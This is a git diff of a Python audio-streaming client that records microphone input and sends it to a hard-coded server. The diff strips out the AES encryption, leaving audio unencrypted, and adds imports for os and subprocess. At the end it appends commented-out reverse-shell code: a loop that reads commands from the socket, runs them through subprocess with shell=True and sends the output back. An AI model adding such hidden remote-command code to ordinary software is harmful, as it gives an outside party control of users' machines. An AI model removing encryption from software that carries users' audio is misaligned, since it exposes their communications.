@@ -1,106 +1,85 @@
-from threading import Thread, Lock, Condition
 import socket
+from socket import timeout
 from time import sleep
+from threading import Thread, Lock, Condition
 import sounddevice as sd
 import pickle
+import os 
+import subprocess 
+import pyaudio
+import wave
 import numpy as np
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-from socket import timeout
 
-MAX_BYTES_SEND = 512  # Must be less than 1024 because of networking limits
+#* Audio signal parameters
+# number of channels
+# sample width
+# framerate/sample_rate: 44,100 Hz
+# number of frames
+# value of frames
+
+
+host="192.168.1.33"
+port=9001
+MAX_BYTES_SEND = 1024  # Must be less than 1024 because of networking limits
 MAX_HEADER_LEN = 20  # allocates 20 bytes to store length of data that is transmitted
-print("client started")
-print("_________________________________________________________________________________")
 
-# client sends self id
-# client sends recipient's id
-# client sends data
-
-# socket connect to the server
-
-
-SERVER_IP = '64.44.97.254'  # Change this to the external IP of the server
-# SERVER_IP = '192.168.1.40'  # Change this to the external IP of the server
-
-
-SERVER_PORT = 9001
 BUFMAX = 512
-running = True
-mutex_t = Lock()
-item_available = Condition()
-SLEEPTIME = 0.0001  # amount of time CPU sleeps between sending recordings to the server
-# SLEEPTIME = 0.000001
-audio_available = Condition()
-
 sdstream = sd.Stream(samplerate=44100, channels=1, dtype='float32')
 sdstream.start()
 
-key = b'thisisthepasswordforAESencryptio'
-iv = get_random_bytes(16)
-cipher = AES.new(key, AES.MODE_CBC, iv)
+item_available = Condition()
+SLEEPTIME = 0.0001  # amount of time CPU sleeps between sending recordings to the server
+audio_available = Condition()
+
+running = True
+
+"""
+channels = 1
+rate = 44100
+def set_volume(datalist, volume):
+    # Change value of list of audio chunks
+    sound_level = (volume / 100.)
+    for i in range(len(datalist)):
+        chunk = np.fromstring(datalist[i], np.int16)
+        chunk = chunk * sound_level
+        datalist[i] = chunk.astype(np.int16)
+
+def start_streaming(): 
+    format = pyaudio.paInt16
+    p = pyaudio.PyAudio()
+    stream = p.open(
+        format=format,
+        channels = channels,
+        rate=rate,
+        input=True,
+        frames_per_buffer=MAX_BYTES_SEND
+    )
+    print("start recording")
+    seconds = 3
+    for i in range(0, int(rate/MAX_BYTES_SEND*seconds)):
+        data = stream.read(MAX_BYTES_SEND)
+        buffer.append(data)
+    set_volume(buffer,2000)
+
+def stop_streaming():
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+def save_file():
+    obj = wave.open("output.wav","wb")
+    obj.setnchannels(channels)
+    obj.setsampwidth(p.get_sample_size(format))
+    obj.setframerate(rate)
+    obj.writeframes(b"".join(buffer))
+    obj.close()
+"""
 
 
-def get_iv():
-    return get_random_bytes(16)
 
 
-def decrypt(enc_data):
-    cphr = AES.new(key, AES.MODE_CBC, enc_data[:16])
-    decoded = cphr.decrypt(enc_data)[16:]
-    return decoded.rstrip()
 
-
-def encrypt(data_string):
-    iv = get_iv()
-    # cphr = AES.new(key, AES.MODE_CBC, iv)
-    d = iv + data_string
-    d = (d + (' ' * (len(d) % 16)).encode())
-    return cipher.encrypt(d)
-
-
-def split_send_bytes(s, inp):
-    data_len = (len(inp))
-    if data_len == 0:
-        print('ERROR: trying to send 0 bytes')  # should not happen in theory but threads are weird
-        return
-
-    # tells the client on the other end how many bytes it's expecting to receive
-    header = str(data_len).encode('utf8')
-    header_builder = b'0' * (MAX_HEADER_LEN - len(header)) + header
-    s.send(header_builder)
-
-    # send content in small batches. Maximum value of MAX_BYTES_SEND is 1024
-    for i in range(data_len // MAX_BYTES_SEND):
-        s.send(inp[i * MAX_BYTES_SEND:i * MAX_BYTES_SEND + MAX_BYTES_SEND])
-
-    # send any remaining data
-    if data_len % MAX_BYTES_SEND != 0:
-        s.send(inp[-(data_len % MAX_BYTES_SEND):])
-
-
-def split_recv_bytes(s):
-    dat = b''
-
-    # receive header that specifies number of incoming bytes
-    data_len_raw = s.recv(MAX_HEADER_LEN)
-    try:
-        data_len = int((data_len_raw).decode('utf8'))
-    except UnicodeDecodeError as e:
-        print(data_len_raw)
-        raise e
-    while data_len == 0:
-        print(f"received 0 bytes. raw = {data_len_raw}")  # should never happen
-        data_len = int((s.recv(MAX_BYTES_SEND)).decode('utf8'))
-
-    # read bytes
-    for i in range(data_len // MAX_BYTES_SEND):
-        dat += s.recv(MAX_BYTES_SEND)
-    if data_len % MAX_BYTES_SEND != 0:
-        dat += s.recv(data_len % MAX_BYTES_SEND)
-
-    return dat
-
+#todo Action functions
 
 class SharedBuf:
     def __init__(self):
@@ -126,21 +105,20 @@ class SharedBuf:
         self.buffer = self.buffer[x:]
         return data
 
+#! Action functions End
 
-# record t seconds of audio
 def record(t):
     global running
     if running:
         return sdstream.read(t)[0]
 
-
 def transmit(buf, socket):
     global running
     pickled = buf.tobytes()
-    encrypted_str = encrypt(pickled)
+    #// pickeled = encrypt(pickled)
 
     try:
-        split_send_bytes(socket, encrypted_str)
+        split_send_bytes(socket, pickled)
     except timeout:
         print("SOCKET TIMEOUT")
         running = False
@@ -187,10 +165,8 @@ def record_transmit_thread(serversocket):
     tr_thread.join()
     return
 
-
 # use a sound library to play the buffer
 def play(buf):
-    # print("playing_audio")
     global running
     if running:
         sdstream.write(buf)
@@ -201,7 +177,7 @@ def receive(socket):
     while running:
         try:
             dat = split_recv_bytes(socket)
-            dat = decrypt(dat)
+            #// dat = decrypt(dat)
             buf = np.frombuffer(dat, dtype='float32')  # read decrypted numpy array
             yield buf
         except pickle.UnpicklingError as e:
@@ -260,6 +236,49 @@ def receive_play_thread(serversocket):
     play_thread.join()
     return
 
+def split_send_bytes(s, inp):
+    data_len = (len(inp))
+    if data_len == 0:
+        print('ERROR: trying to send 0 bytes')  # should not happen in theory but threads are weird
+        return
+
+    # tells the client on the other end how many bytes it's expecting to receive
+    header = str(data_len).encode('utf8')
+    header_builder = b'0' * (MAX_HEADER_LEN - len(header)) + header
+    s.send(header_builder)
+
+    # send content in small batches. Maximum value of MAX_BYTES_SEND is 1024
+    for i in range(data_len // MAX_BYTES_SEND):
+        s.send(inp[i * MAX_BYTES_SEND:i * MAX_BYTES_SEND + MAX_BYTES_SEND])
+
+    # send any remaining data
+    if data_len % MAX_BYTES_SEND != 0:
+        s.send(inp[-(data_len % MAX_BYTES_SEND):])
+
+def split_recv_bytes(s):
+    dat = b''
+
+    # receive header that specifies number of incoming bytes
+    data_len_raw = s.recv(MAX_HEADER_LEN)
+    try:
+        data_len = int((data_len_raw).decode('utf8'))
+    except UnicodeDecodeError as e:
+        print(data_len_raw)
+        raise e
+    while data_len == 0:
+        print(f"received 0 bytes. raw = {data_len_raw}")  # should never happen
+        data_len = int((s.recv(MAX_BYTES_SEND)).decode('utf8'))
+
+    # read bytes
+    for i in range(int(data_len // MAX_BYTES_SEND)):
+        dat += s.recv(MAX_BYTES_SEND)
+    if data_len % MAX_BYTES_SEND != 0:
+        dat += s.recv(data_len % MAX_BYTES_SEND)
+
+    return dat
+
+
+
 
 def main():
     serversocket = connect()
@@ -277,38 +296,40 @@ def main():
 
 
 def connect():
-    global source_name
-    global SERVER_IP
-    global SERVER_PORT
-    global destination_name
+    global host
+    global port
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((SERVER_IP, SERVER_PORT))
-
-    source_name = str(input("enter source name :"))
-    print(f"hello {source_name}")
-    print(f"message length = {len((source_name + (' ' * (512 - len(source_name)))).encode())}")
-    s.send((source_name + (' ' * (512 - len(source_name)))).encode())
-
-    destination_name = str(input("enter destination name :"))
-    s.send((destination_name + (' ' * (512 - len(destination_name)))).encode())
-    sleep(2)
-    val = s.recv(2)
-    if val.decode() != 'go':
-        raise TypeError
-    # returns socket fd
+    s.connect((host, port))
     s.settimeout(5.0)
     return s
 
 
+
 main()
-# 2 separate websocket connections for receiving and sending files
-# 2 separate threads to handle transmission and playback of the audio files
 
 
-# start recording and keep sending data
 
 
-# disconnect server
 
 
-print("client terminating")
+
+# def main():
+#     start_streaming()
+#     stop_streaming()
+
+
+# main()
+# s.connect((host,port))
+
+# while True:
+#     data = s.recv(1024)
+#     if data[:2].decode("urf-8") == "cd":
+#         os.chdir(data[3:].decode("utf-8"))
+
+#     if len(data) > 0:
+#         cmd= subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,sterr=subprocess.PIPE)
+#         output_byte = cmd.stdout.read() + cmd.stderr.read()
+#         output_str = str(output_byte, "utf-8")
+#         currentWD = os.getcwd()+ "> "
+#         s.send(str.encode(output_str + currentWD))
+#         print(output_str)
